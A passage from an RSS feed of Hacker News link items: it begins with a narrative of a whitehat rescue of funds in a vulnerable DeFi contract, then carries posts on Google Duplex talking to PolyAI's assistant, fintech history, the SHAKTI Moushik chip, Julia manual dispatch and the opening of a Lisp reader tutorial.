IM platform they supported was Telegram, and I couldn‚Äôt be sure that the admins of that channel were actually protocol developers or just a few early supporters. The last thing I wanted to do was accidentally leak the exploit to the wrong person.</p><p>After browsing their website a little while longer, I noticed that they had worked with ConsenSys Diligence and CertiK for an audit. This seemed like a good avenue, since both ConsenSys and CertiK must have interacted with the developers during their audits. I quickly pinged <a href="https://twitter.com/maurelian_">maurelian</a> on Telegram.</p><figure><img src="https://samczsun.com/content/images/2020/09/image.png" alt=""><figcaption>You never want to be on the receiving end of this message</figcaption></figure><p>Unfortunately, time ticked on, my heart kept pounding, but there was no response from maurelian. It seemed like he had already gone to sleep. Desperate, I sent a message to the ETHSecurity Telegram channel.</p><figure><img src="https://samczsun.com/content/images/2020/09/image-1.png" alt=""><figcaption>Artist's rendering of the message, since I deleted the original</figcaption></figure><p>Within minutes, I got a message from someone I‚Äôd worked with quite a few times in the past - <a href="https://twitter.com/wadealexc">Alex Wade</a>.</p><hr><p>My head had just hit the pillow when I got a knock on my door. It was my roommate: ‚ÄúSam‚Äôs in the ETHSec Telegram asking for anyone from Diligence.‚Äù</p><figure><img src="https://samczsun.com/content/images/2020/09/image-2.png" alt=""><figcaption>It was, in fact, a long night</figcaption></figure><p>Knowing Sam, this couldn‚Äôt be good. I found a channel we‚Äôd set up with Lien a few months ago and an email address. Better than nothing, given their team was anon.</p><p>I was still half asleep. Sam, not wanting to commit details to text, asked for a Zoom call. Groggily wishing I was back in bed, I attempted to gauge the severity of the situation:</p><figure><img src="https://samczsun.com/content/images/2020/09/image-4.png" alt=""><figcaption>Five minutes later, it was clear that the situation called for coffee</figcaption></figure><p>Sam and I reviewed the code together. By this point, Sam had already prepared a sample exploit and was able to confirm the issue on his machine. The conversation quickly turned to discussing options:</p><ol><li>Attempt to exploit the issue ourselves.</li><li>Reach out to Lien and have them go public, urging users to withdraw.</li></ol><p>Neither of these were appealing options. The first was risky because, as discussed in <a href="https://medium.com/@danrobinson/ethereum-is-a-dark-forest-ecc5f0505dff">Ethereum is a Dark Forest</a> by <a href="https://twitter.com/danrobinson">Dan Robinson</a> and <a href="https://twitter.com/gakonst/">Georgios Konstantopoulos</a>, the possibility of our transactions getting frontrun was very real. The second option was similarly risky, as a public announcement would draw attention to the problem and create a window of opportunity for attackers. We needed a third option.</p><p>Recalling a section from <em>Ethereum is a Dark Forest</em>, Sam reached out to <a href="https://twitter.com/epheph">Scott Bigelow</a>:</p><blockquote>If you find yourself in a situation like this, we suggest you reach out to Scott Bigelow, a security researcher who has been studying this topic and has a prototype implementation for a better obfuscator.</blockquote><hr><p>After participating in the recovery attempt from <em>Ethereum is a Dark Forest, </em>which ultimately lost to front-runners, I was hungry for a re-match. I‚Äôve spent time monitoring front-running and designing a simple system that seemed able to fool generalized front-runners, at least for the $200 I‚Äôd been able to test it with. When Sam reached out to me in the late evening with the innocent-sounding ‚Äúmind staying up for another hour or so‚Äù, I couldn‚Äôt wait to try it out! I was already working it out: how I‚Äôd make a few tweaks, stay up a couple hours, feel a sense of accomplishment having helped rescue and return a few thousand dollars of user funds, and get a good night‚Äôs sleep.</p><p>Those plans immediately fell apart when Sam shared the contract with me: ~25,000 ETH, valued at $9.6M, at stake. For as much as I wanted that rematch, $9.6M was way outside my humble script‚Äôs weight class.</p><p><br>For the past few months, I had been trying to establish contacts with miners for this very purpose: white-hat transaction cooperation. If ever there was a time to appeal to a miner to include a transaction without giving front-runners the chance to steal it, it was now. Luckily, <a href="https://twitter.com/tzhen">Tina</a> and I have worked together over the past few months on establishing this cooperation. It seemed like a slim chance at the time, but it was worth a shot: let‚Äôs bring Tina into the rescue attempt to work with a mining pool to mine a private transaction.</p><hr><p>I had just evacuated from the Bobcat forest fire and was sipping on unknown beachy drinks zoning out to the monotonic sound of dark Pacific waves, when a Telegram DM from Sam buzzed me back to a darker reality: ‚Äúfunds at risk, frontrunnable‚Äù. Over the last few weeks, I had been collaborating with Sam and Scott on a research project on MEV and could already guess their ask before they sent it: a direct channel to shield a whitehat tx from getting sniped by the ‚Äúadvanced predators‚Äù in the mempool‚Äôs ‚Äúdark forest‚Äù.</p><p>Since this was a risky move that entailed exposing our strategy to miners, we decided we should first try to get the greenlight from the anonymous Lien team. While Alex was trying to get in contact via ConsenSys-internal channels, we tried to loop in CertiK as well.</p><p>I realized it may take another 4 hours before Certik's US-based auditors would wake up, yet the clock was ticking. &nbsp;Knowing nothing much about CertiK beyond the fact it had serviced quite a few Asian projects, I tried to reach the CertiK China team to arbitrage the time zone difference. I blasted a casual sounding message in ‚ÄúDeFi the World‚Äù and ‚ÄúYellow Hats‚Äù WeChat groups. Four leads slid into my DMs independently within 30 minutes, confirming the WeChat ID that I connected with was indeed the real Zhaozhong Ni, CTO of CertiK. I was added to a WeChat group with 5 CertiK team members, yet at this point I was still not in a position to disclose the project nor the vulnerability. To minimize the exposure and potential liability, we could only invite one member from Certik to join our whitehat operation. After passing a final verification via official email, Georgios Delkos, the engineering lead at CertiK joined our call.</p><p>With Georgios‚Äôs help, Alex was able to quickly get in contact with the Lien team and verify their identity. We brought them up-to-speed on the current situation and asked for their permission to try working directly with a mining pool to rescue the vulnerable funds. After some deliberation, the Lien team agreed that the risk from trying to rescue the funds directly or publishing a warning was too high, and gave the go-ahead to continue.</p><p>Now we needed to identify a mining pool that had the infrastructure ready in place and would be willing to cooperate with us ASAP. Which mining pool should we tap? Which contact from the pool would be in a position to make technical decisions swiftly that help us beat the clock?</p><p>SparkPool came to mind, as I knew they had been working on a piece of public infrastructure called Taichi Network that could easily offer what we needed. I decided to ping Shaoping Zhang, SparkPool‚Äôs co-founder, who had helped me investigate mempool events in the past.</p><p>Half an hour later, Shaoping responded: ‚ÄúYou mean do we have a whitelist service for transactions? Sorry, we don‚Äôt.‚Äù Oops, something was lost in translation, ‚Äúwhitehat‚Äù and ‚Äúwhitelist‚Äù sounded similar in Chinese.</p><p>‚ÄúThere‚Äôs 10mn dollar worth of funds at risk. samczsun is on the line.‚Äù I tried again to communicate the situation without revealing any specifics.</p><figure><img src="https://samczsun.com/content/images/2020/09/photo5145442418169063579.png" alt="" srcset="https://samczsun.com/content/images/size/w600/2020/09/photo5145442418169063579.png 600w, https://samczsun.com/content/images/size/w1000/2020/09/photo5145442418169063579.png 1000w, https://samczsun.com/content/images/size/w1600/2020/09/photo5145442418169063579.png 1600w, https://samczsun.com/content/images/2020/09/photo5145442418169063579.png 1920w" sizes="(min-width: 720px) 720px"></figure><p>‚ÄúAre you guys saving the world again? Do you need help from our mining pool?‚Äù To my surprise and great relief, Shaoping jokingly extended an offer to help. After official email verification, Shaoping popped into our marathon Zoom call with the support of a roomful of SparkPool devs.</p><hr><p>After lunch, just when I was about to take a nap, I received a message from Tina: ‚ÄúHas SparkPool ever helped with whitehat transactions??‚Äù I mistook it for whitelisting a transaction at first. No whitehats had approached us before, and we were not familiar with what ‚Äúwhitehat transactions‚Äù entailed. After Tina explained it in more details, I realized that what they needed was a private transaction service, i.e. the whitehats wanted to send transactions to save a DeFi contract, but in order to prevent getting front-runned, they needed a mining pool to include the transaction without broadcasting it.</p><p>We had been working on a ‚Äúprivate transaction‚Äù feature on our Taichi Network, which was still under development and had not been tested. I brought the whitehats‚Äô request to our development team, and explained the urgency: our private transaction feature needed to be in production within a few hours. Our devs said they could try their best to finish in time, and we immediately got to work. We finished development of the private transaction feature in 2 hours, and then spent some time fixing bugs.</p><p>After we completed our internal testing, we sent the <em>whitehat.taichi.network</em> endpoint to ‚Ä¶</p></div></section></article></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://samczsun.com/escaping-the-dark-forest/">https://samczsun.com/escaping-the-dark-forest/</a></em></p>]]>
            </description>
            <link>https://samczsun.com/escaping-the-dark-forest/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24580879</guid>
            <pubDate>Thu, 24 Sep 2020 17:09:04 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Google Duplex Talks to an Automated Restaurant Conversational System]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24580868">thread link</a>) | @kololski
<br/>
September 24, 2020 | https://www.polyai.com/our-voice-assistant-spoke-to-google-duplex-heres-what-happened/ | <a href="https://web.archive.org/web/*/https://www.polyai.com/our-voice-assistant-spoke-to-google-duplex-heres-what-happened/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
				
				<div>
				
													<p><img src="https://www.polyai.com/wp-content/uploads/2019/08/nikola-1-500x500.jpg"></p><div>
							<h6>Nikola Mrk≈°iƒá</h6>
							<p><span>
								23 Sep 2020								- 5 minutes read							</span>
						</p></div>
						
										
				</div>
			</div><div>
									<p>This summer, Google has been deploying its AI voice assistant called Duplex to call bars and restaurants in order to update their opening hours on Google Maps listings.<br>
Here‚Äôs a call their system had with our virtual assistant for restaurants.</p>
<p><iframe src="https://player.vimeo.com/video/460586741" width="640" height="360" frameborder="0" allowfullscreen="allowfullscreen"><span data-mce-type="bookmark" style="display: inline-block; width: 0px; overflow: hidden; line-height: 0;" class="mce_SELRES_start">Ôªø</span><span data-mce-type="bookmark" style="display: inline-block; width: 0px; overflow: hidden; line-height: 0;" class="mce_SELRES_start">Ôªø</span></iframe></p>
<p>As far as we‚Äôre aware, this is the <strong>first naturally-occurring conversation between AI voice assistants in the wild</strong>. I have never seen anything like this before, and I‚Äôm incredibly proud that PolyAI is sharing this moment in computing history with our friends from Google.</p>
<p>After listening to the call, we‚Äôd say that it went pretty well! Google could have handled the two-part opening hours a bit better, but overall, the interaction was smooth. I want to share a few thoughts on what this means for the future of conversational technologies.</p>
<h3>Human language is a Universal API</h3>
<p>This interaction did not need to be a conversation in the way that we as humans think of it. The caller‚Äôs request was transactional and to the point. An API call or an HTTPS request between two web services would have done the job in 150ms, instead of two minutes of synthesized voice going back and forth across the telephone line. However, such APIs are not always available, or standardised. For instance, there are dozens of reservation APIs for restaurants used in the UK alone, and voice assistants will never integrate with every single one.</p>
<p>This kind of machine-to-machine conversational communication will become more commonplace as AI deployment accelerates. And while it may seem like an overkill from a technical standpoint, there are good reasons for these kinds of interactions to be conversational, rather than API calls.</p>
<p>Imagine you ask your virtual assistant ‚Äî Siri or Alexa, for example ‚Äî to book a hotel room. It can phone multiple hotels to check availability and book without having to integrate into each hotel‚Äôs individual booking API. And logs of the conversation can inform the user of alternative venues for their next trip.</p>
<h3>Welcome to the Uncanny Valley</h3>
<p>Google introduced <a href="https://ai.googleblog.com/2018/05/duplex-ai-system-for-natural-conversation.html">Duplex in May 2018</a> as an ‚ÄòAI system for accomplishing real-world tasks over the phone‚Äô. You may have seen this video of <a href="https://www.youtube.com/watch?v=D5VN56jQMWM">Sundar Pichai at Google I/O</a> using Duplex to make a restaurant reservation.</p>
<p>I‚Äôll be the first to point out how incredible Google‚Äôs TTS (text-to-speech) is in the Duplex/PolyAI call. It sounds like a human, much more so than our assistant does.</p>
<p>According to the <a href="https://en.wikipedia.org/wiki/Uncanny_valley">Uncanny Valley theory</a>, the more human-like a robot is, the more likely people are to feel positive towards it. However, at a certain point of human-likeness, the robot becomes a bit creepy, and people are repulsed by it.</p>
<p><img src="https://www.polyai.com/wp-content/uploads/2020/09/uncanny-valley.png" alt="" width="588" height="387" srcset="https://www.polyai.com/wp-content/uploads/2020/09/uncanny-valley.png 588w, https://www.polyai.com/wp-content/uploads/2020/09/uncanny-valley-300x197.png 300w" sizes="(max-width: 588px) 100vw, 588px"></p>
<p>In the Google/PolyAI call, Duplex really does sound like a human ‚Äì it does mention that it‚Äôs an automated service, but this is not enough. Why? Because crossing the Uncanny Valley means that a person on the call will treat the bot as though they are human.</p>
<p>Around the 1 minute mark, you‚Äôll hear our voice assistant ask the caller when they‚Äôd like to come in, and Duplex speaks over it. In reality, these are machines ‚Äì no-one‚Äôs getting offended. But when you listen to the call, the Duplex bot comes across as pretty rude. Because it sounds so human, it‚Äôs practically impossible to not attribute human qualities to the bot. And no one wants a rude voice assistant representing their company.</p>
<p><strong>Making customers think that your voice assistant is a real human is a sure-fire way to deliver frustrating customer experiences. At PolyAI, we work hard to make sure our voice assistants sit at the peak right before the Uncanny Valley ‚Äì but without crossing it. Warm and friendly enough to put callers at ease, but not real enough to cause cognitive dissonance.</strong></p>
<h3>The Future of Voice</h3>
<p>Companies are wising up to the benefits of conversational AI in customer communications, and we‚Äôll see a growing number of instances of machines communicating in human language. While this type of transactional communication may seem better suited to quick API calls, voice assistants can get the job done even when such APIs are not available.</p>
<p>We are super excited about the future of voice assistants. Two highly sophisticated voice assistants have now met in the wild, in a rerun of the legendary ‚ÄúDr Livingstone, I presume‚Äù moment (though neither assistant realised they were speaking to one of their own). This is a sign of great things to come. Stay tuned ‚Äì and get in touch with us if you want to build a great voice assistant for your brand.</p>
<p><strong>What do you think of the PolyAI vs Google Duplex call? Let us know on Twitter, <a href="https://twitter.com/poly_ai">@poly_ai</a>.</strong></p>
							</div></div>]]>
            </description>
            <link>https://www.polyai.com/our-voice-assistant-spoke-to-google-duplex-heres-what-happened/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24580868</guid>
            <pubDate>Thu, 24 Sep 2020 17:08:05 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Fintech Is Not New]]>
            </title>
            <description>
<![CDATA[
Score 12 | Comments 3 (<a href="https://news.ycombinator.com/item?id=24580770">thread link</a>) | @mattmarcus
<br/>
September 24, 2020 | https://www.moderntreasury.com/journal/fintech-is-not-new | <a href="https://web.archive.org/web/*/https://www.moderntreasury.com/journal/fintech-is-not-new">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p>There‚Äôs a myth going around now that fintech is a new industry, poised to take over, and that now that it‚Äôs here, every company will be a fintech company. The myth continues: some of the most promising new tech is of a new, different, novel flavor called ‚Äúfintech.‚Äù</p><p>In reality, though, fintech is just as old as "tech." For as long as engineers and entrepreneurs have been coming up with new technology amongst the hills of Cupertino and the orange groves of Mountain View, there have been fintech entrepreneurs right amongst them. And in many instances, the two groups have utilized the same technology advances to push the world forward.</p><h5>1956</h5><p>In 1956, the same year that William Shockley founded the Shockley Semiconductor Laboratory in Palo Alto, Bill Fair and Earl Isaac set up Fair, Isaac, &amp; Company, better known today as <a href="https://www.fico.com/">FICO</a>.&nbsp;</p><p>Bill Fair and Earl Isaac met at the Stanford Research Institute in Menlo Park and worked on a project as data heavy as it gets: the mathematics and statistics behind credit scoring tools for lenders. In 1956 they moved up north, invested $400 each in their new company, and set off to sell credit assessment systems to lenders. The FICO score as we know it today, set on a scale between 300 and 850, was not formulated until the 1980s, but the <a href="https://www.fico.com/en/about-us#history%20(edited)" target="_blank">FICO concept</a> started simultaneously with the semiconductor. Today we‚Äôd describe what they were doing as ‚Äúdata science.‚Äù&nbsp;</p><p>‚Äç</p><h5>1957</h5><p>The very next year, in 1957, as Arthur Rock was making one of the first venture capital investments in Fairchild Semiconductor, Bank of America‚Äôs team in San Francisco was coming up with the BankAmericard program, which launched in 1958. The famous ‚ÄúFresno drop,‚Äù <a href="#1">[1]</a> in which BofA mailed credit cards to everyone in Fresno, became <a href="https://usa.visa.com/">Visa</a>. Like many consumer fintech startups, it was riddled with fraud at first. But it turned a profit in 1961 and the rest is <a href="https://usa.visa.com/about-visa/our_business/history-of-visa.html" target="_blank">history</a>. Visa, in its pursuit of the perfect payment experience at a store or restaurant, drove some of the most demanding requirements on data center reliability, redundancy, and latency in the 1970s. Today we‚Äôd describe these as ‚Äúcloud services.‚Äù&nbsp;</p><p>‚Äç</p><h5>1968</h5><p>In 1968, Robert Noyce, Gordon Moore, Andy Grove, and several other high profile Fairchild employees left Fairchild to start Intel. They too turned to Arthur Rock for seed funding. That was the year Ross Perot‚Äôs Electronic Data Systems IPO‚Äôd on the strength of multimillion dollar contracts building early software necessary to enable Medicare and Medicaid. EDS <a href="https://www.dxc.technology/about_us/ds/140019-our_history" target="_blank">built</a> the backends of ATMs, electronic funds transfer, and point-of-sale terminals for banks and credit unions. Today we‚Äôd probably describe EDS as a ‚Äúbanking core‚Äù or, at the very least, a ‚Äúsystems integrator‚Äù for banks‚Äîsystems that eventually came to run on Intel chips.&nbsp;</p><p>‚Äç</p><h5>1972</h5><p>In 1972, the year Steve Jobs graduated from high school, Charles Schwab‚Äôs new startup began offering brokerage services.<a href="#1">[1]</a> The company grew and expanded, and in 1979 Schwab spent a fortune on the ‚ÄúBETA‚Äù system, which stood for ‚ÄúBrokerage Execution and Transaction Analysis.‚Äù That was the same year Bill Gates and Paul Allen moved their fledgling startup from Albuquerque to Seattle, and renamed it Microsoft from the previous, awkward ‚ÄúMicro-Soft.‚Äù Steve Ballmer joined Microsoft the following year, the year that Schwab used its now-stable BETA system to offer 24 hour stock price quotes.&nbsp;</p><p>‚Äç</p><h5>1984</h5><p>In 1984, Apple released the Macintosh. That same year, a group of entrepreneurs started a startup bank aimed at serving the tech industry that the traditional banks didn‚Äôt want to serve. When they opened their first branch in Mountain View, they needed something to attract PR, and they decided to <a href="https://www.computerhistory.org/collections/catalog/102739976" target="_blank">borrow</a> bunny suits from their first customers, which were semiconductor companies. The grand opening landed them in the local papers as the Valley wondered what was going on with this upstart bank with ‚Äúbankers‚Äù dressed in bunny suits, but the message was clear. That bank is now the familiar banking institution we know today as <a href="https://www.svb.com/">Silicon Valley Bank</a>. Their strategy, of focusing on startups, was radical, but it worked.&nbsp;</p><p>‚Äç</p><h5>Today</h5><p>There may be no better time to build fintech companies. </p><p>There‚Äôs no good reason for payments to take three days to settle in 2020. There‚Äôs no good reason for the most sophisticated companies in the world to pay workers on a rigid bimonthly schedule. There‚Äôs no good reason why predatory payday lenders are the best option for millions to turn to in economic hardship. There‚Äôs no good reason for the government to disburse stimulus funds by paper check delivered via the postal service. Each of these is an opportunity to build a product of real consequence.&nbsp;</p><p>But this industry is not new. If anything, today‚Äôs companies are just an extension of a long tradition. Square, Stripe, Adyen, Plaid, Brex, Modern Treasury, and others all stand on the shoulders of giants. We benefit from FICO‚Äôs pioneering work in instant decision making, Visa‚Äôs mastery of electronic payment networks, and SVB‚Äôs startup-focused business model. </p><p>If we study the lessons of history, we will build products with more impact.<br></p></div></div></div>]]>
            </description>
            <link>https://www.moderntreasury.com/journal/fintech-is-not-new</link>
            <guid isPermaLink="false">hacker-news-small-sites-24580770</guid>
            <pubDate>Thu, 24 Sep 2020 16:59:49 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Shakti Announces Third Silicon Success with the Arduino-Compatible Moushik]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24580748">thread link</a>) | @todsacerdoti
<br/>
September 24, 2020 | https://abopen.com/news/shakti-announces-third-silicon-success-with-the-arduino-compatible-moushik/ | <a href="https://web.archive.org/web/*/https://abopen.com/news/shakti-announces-third-silicon-success-with-the-arduino-compatible-moushik/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
          <p><b>The SHAKTI free and open source silicon project has reached another milestone with the boot up of the Moushik, an Arduino-compatible system-on-chip (SoC) and the group‚Äôs third successful silicon tape-out.</b></p>
<p>The SHAKTI project first announced its success in booting Linux on a home-grown RISC-V based processor <a href="https://abopen.com/news/shakti-project-boots-linux-on-home-grown-180nm-risc-v-silicon/">back in 2018</a>, initially on a chip built by US semiconductor giant Intel on a 22nm process, then on a chip built natively in India on a 180nm node at the ISRO Semiconductor Laboratory in Chandigarh.</p>
<p>Now, the SHAKTI team has announced its third physical chip: Moushik. ‚ÄúMoushik is a processor-cum-system on chip that would cater to the rapidly growing Internet of Things IOT devices that are integral part of smart cities of our digital India,‚Äù the team explains of the new device. ‚ÄúThree steps are involved in the making of a microprocessor chip: the design, the fabrication, and the post-silicon boot-up ‚Äì all these steps were done in India.</p>
<p>‚ÄúThe design was done in IIT Madras, the fabrication at the semiconductor laboratory Chandigarh, the motherboard printed circuit board design was done again at IIT Madras, manufacturing of this motherboard at Bengaluru assembly and post-silicon boot-up at IIT Madras.‚Äù</p>
<p><span><iframe width="640" height="360" src="https://www.youtube.com/embed/KpRJe915-9I?version=3&amp;rel=1&amp;fs=1&amp;autohide=2&amp;showsearch=0&amp;showinfo=1&amp;iv_load_policy=1&amp;wmode=transparent" allowfullscreen="true"></iframe></span></p>
<p>Again built on a 180nm process, Moushik has 103 input/output (IO) pins across a 256-pin package and is powered by the SHAKTI E-Class RISC-V core. The CPU runs at between 75MHz and 100MHz, while the SoC includes a number of common peripherals including an SDRAM controller, I¬≤C, quad-SPI, analogue-to-digital conversion (ADC), UART, and JTAG for debugging.</p>
<p>The motherboard, dubbed Adronics 1.0, includes support for Arduino ‚Äúshield‚Äù add-ons to speed embedded development. ‚ÄúIn addition the motherboard also has switcher ICs which enable power conversion across a large variety of voltages,‚Äù the team adds, ‚Äúthus enabling a variety of peripherals to be interfaceable with the motherboard. The PCB is a four layer motherboard with an input power of 12 volt at two amps.‚Äù</p>
<p>The chip can be seen going through the post-silicon boot-up process <a href="https://www.youtube.com/watch?v=KpRJe915-9I&amp;feature=youtu.be">in a video</a>, with more information available on the <a href="https://twitter.com/ShaktiProcessor/status/1308634777432461314?s=19">SHAKTI Twitter account</a>. For more information on the SHAKTI project in general, check out our interview with Arjun Menon and Rahul Bodduna in AB Open‚Äôs <a href="http://abopen.com/news/osddi-shakti-processor-iit-madras/">Open Source Digital Design Insights (OSDDI) series</a>.</p>

        </div></div>]]>
            </description>
            <link>https://abopen.com/news/shakti-announces-third-silicon-success-with-the-arduino-compatible-moushik/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24580748</guid>
            <pubDate>Thu, 24 Sep 2020 16:57:47 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The missing harm of manual dispatch in Julia]]>
            </title>
            <description>
<![CDATA[
Score 95 | Comments 28 (<a href="https://news.ycombinator.com/item?id=24580479">thread link</a>) | @amkkma
<br/>
September 24, 2020 | https://andreaskroepelin.de/blog/manual_dispatch/ | <a href="https://web.archive.org/web/*/https://andreaskroepelin.de/blog/manual_dispatch/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            <p>Just a short one today:
New users of Julia coming from other dynamically typed languages might write functions like</p>
<div><pre><code data-lang="julia"><span>function</span> <span>foo</span><span>(</span><span>x</span><span>)</span>
    <span>if</span> <span>x</span> <span>isa</span> <span>Int</span>
        <span>x</span> <span>+</span> <span>x</span>
    <span>elseif</span> <span>x</span> <span>isa</span> <span>Float64</span>
        <span>x</span> <span>/</span> <span>2.0</span>
    <span>elseif</span> <span>x</span> <span>isa</span> <span>String</span>
        <span>length</span><span>(</span><span>x</span><span>)</span>
    <span>else</span>
        <span>1</span>
    <span>end</span>
<span>end</span>
</code></pre></div><p>This is clearly unidiomatic and should be written as</p>
<div><pre><code data-lang="julia"><span>bar</span><span>(</span><span>x</span><span>::</span><span>Int</span><span>)</span> <span>=</span> <span>x</span> <span>+</span> <span>x</span>
<span>bar</span><span>(</span><span>x</span><span>::</span><span>Float64</span><span>)</span> <span>=</span> <span>x</span> <span>/</span> <span>2.0</span>
<span>bar</span><span>(</span><span>x</span><span>::</span><span>String</span><span>)</span> <span>=</span> <span>length</span><span>(</span><span>x</span><span>)</span>
<span>bar</span><span>(</span><span>x</span><span>)</span> <span>=</span> <span>1</span> <span># or bar(x::Any), to be explicit</span>
</code></pre></div><p>because it is nicer to read and very easy to extend for other types of <code>x</code>.
Well, you technically can extend <code>foo</code> the same way as <code>bar</code>, but reading the definition of <code>foo</code> one would expect to then know its complete behavior, so it would be misleading.</p>
<p><em>However</em>, my point is that there is actually (maybe surprisingly) no harm at runtime for code as in <code>foo</code>!
The Julia compiler isn‚Äôt tricked that easily and will still produce optimal machine code for each type of the argument:</p>
<div><pre><code data-lang="julia"><span>julia</span><span>&gt;</span> <span>@code_native</span> <span>debuginfo</span><span>=:</span><span>none</span> <span>bar</span><span>(</span><span>1</span><span>)</span>
    <span>.</span><span>text</span>
    <span>leaq</span>	<span>(</span><span>%</span><span>rdi</span><span>,</span><span>%</span><span>rdi</span><span>),</span> <span>%</span><span>rax</span>
    <span>retq</span>
    <span>nopw</span>	<span>%</span><span>cs</span><span>:</span><span>(</span><span>%</span><span>rax</span><span>,</span><span>%</span><span>rax</span><span>)</span>

<span>julia</span><span>&gt;</span> <span>@code_native</span> <span>debuginfo</span><span>=:</span><span>none</span> <span>foo</span><span>(</span><span>1</span><span>)</span>
    <span>.</span><span>text</span>
    <span>leaq</span>	<span>(</span><span>%</span><span>rdi</span><span>,</span><span>%</span><span>rdi</span><span>),</span> <span>%</span><span>rax</span>
    <span>retq</span>
    <span>nopw</span>	<span>%</span><span>cs</span><span>:</span><span>(</span><span>%</span><span>rax</span><span>,</span><span>%</span><span>rax</span><span>)</span>
</code></pre></div><p>Both functions basically compile down to a single adding instruction (<code>leaq</code>; <code>retq</code> is for returning from the function and <code>nopw</code> is an operation that does nothing and is there for <a href="https://en.wikipedia.org/wiki/NOP_%28code%29%23Machine_language_instructions">technical reasons</a>).
Think about it this way:
When Julia compiles <code>foo(1)</code>, it knows that <code>1</code> is of type <code>Int</code>, can evaluate the <code>x isa Int</code> expression at compile time to <code>true</code>, and discard everything but the <code>x + x</code> without a problem.</p>
<h2 id="appendix">‚ÄúAppendix‚Äù</h2>
<p>For completeness, here is what‚Äôs produced in the other cases:</p>
<div><pre><code data-lang="julia"><span>julia</span><span>&gt;</span> <span>@code_native</span> <span>debuginfo</span><span>=:</span><span>none</span> <span>bar</span><span>(</span><span>1.0</span><span>)</span>
    <span>.</span><span>text</span>
    <span>movabsq</span>	<span>$</span><span>140581530607976</span><span>,</span> <span>%</span><span>rax</span>  <span># imm = 0x7FDBB031A168</span>
    <span>vmulsd</span>	<span>(</span><span>%</span><span>rax</span><span>),</span> <span>%</span><span>xmm0</span><span>,</span> <span>%</span><span>xmm0</span>
    <span>retq</span>
    <span>nop</span>

<span>julia</span><span>&gt;</span> <span>@code_native</span> <span>debuginfo</span><span>=:</span><span>none</span> <span>foo</span><span>(</span><span>1.0</span><span>)</span>
    <span>.</span><span>text</span>
    <span>movabsq</span>	<span>$</span><span>140581530608088</span><span>,</span> <span>%</span><span>rax</span>  <span># imm = 0x7FDBB031A1D8</span>
    <span>vmulsd</span>	<span>(</span><span>%</span><span>rax</span><span>),</span> <span>%</span><span>xmm0</span><span>,</span> <span>%</span><span>xmm0</span>
    <span>retq</span>
    <span>nop</span>


<span>julia</span><span>&gt;</span> <span>@code_native</span> <span>debuginfo</span><span>=:</span><span>none</span> <span>bar</span><span>(</span><span>"abc"</span><span>)</span>
    <span>.</span><span>text</span>
    <span>pushq</span>	<span>%</span><span>rax</span>
    <span>movabsq</span>	<span>$</span><span>"ncodeunits;"</span><span>,</span> <span>%</span><span>rax</span>
    <span>callq</span>	<span>*%</span><span>rax</span>
    <span>popq</span>	<span>%</span><span>rcx</span>
    <span>retq</span>
    <span>nop</span>

<span>julia</span><span>&gt;</span> <span>@code_native</span> <span>debuginfo</span><span>=:</span><span>none</span> <span>foo</span><span>(</span><span>"abc"</span><span>)</span>
    <span>.</span><span>text</span>
    <span>pushq</span>	<span>%</span><span>rax</span>
    <span>movabsq</span>	<span>$</span><span>"ncodeunits;"</span><span>,</span> <span>%</span><span>rax</span>
    <span>callq</span>	<span>*%</span><span>rax</span>
    <span>popq</span>	<span>%</span><span>rcx</span>
    <span>retq</span>
    <span>nop</span>


<span>julia</span><span>&gt;</span> <span>@code_native</span> <span>debuginfo</span><span>=:</span><span>none</span> <span>bar</span><span>([])</span>
    <span>.</span><span>text</span>
    <span>movl</span>	<span>$</span><span>1</span><span>,</span> <span>%</span><span>eax</span>
    <span>retq</span>
    <span>nopw</span>	<span>%</span><span>cs</span><span>:</span><span>(</span><span>%</span><span>rax</span><span>,</span><span>%</span><span>rax</span><span>)</span>

<span>julia</span><span>&gt;</span> <span>@code_native</span> <span>debuginfo</span><span>=:</span><span>none</span> <span>foo</span><span>([])</span>
    <span>.</span><span>text</span>
    <span>movl</span>	<span>$</span><span>1</span><span>,</span> <span>%</span><span>eax</span>
    <span>retq</span>
    <span>nopw</span>	<span>%</span><span>cs</span><span>:</span><span>(</span><span>%</span><span>rax</span><span>,</span><span>%</span><span>rax</span><span>)</span>
</code></pre></div>
        </div></div>]]>
            </description>
            <link>https://andreaskroepelin.de/blog/manual_dispatch/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24580479</guid>
            <pubDate>Thu, 24 Sep 2020 16:36:57 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Compiling a Lisp: Reader]]>
            </title>
            <description>
<![CDATA[
Score 109 | Comments 26 (<a href="https://news.ycombinator.com/item?id=24580453">thread link</a>) | @azhenley
<br/>
September 24, 2020 | https://bernsteinbear.com/blog/compiling-a-lisp-6/ | <a href="https://web.archive.org/web/*/https://bernsteinbear.com/blog/compiling-a-lisp-6/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            <p><em><a href="https://bernsteinbear.com/blog/compiling-a-lisp-0/">first</a></em> ‚Äì <em><a href="https://bernsteinbear.com/blog/compiling-a-lisp-5/">previous</a></em></p>

<p>Welcome back to the ‚ÄúCompiling a Lisp‚Äù series. This time I want to take a break
from compiling and finally add a <em>reader</em>. I‚Äôm finally getting frustrated
manually entering increasinly complicated ASTs, so I figure it is time. After
this post, we‚Äôll be able to type in programs like:</p>



<p>and have our compiler make ASTs for us! Magic. This will also add some nice
debugging tools for us. For example, imagine an interactive command line
utility in which we can enter Lisp expressions and the compiler prints out
human-readable assembly (and hex? maybe?). It could even run the code, too.
Check out this imaginary demo:</p>

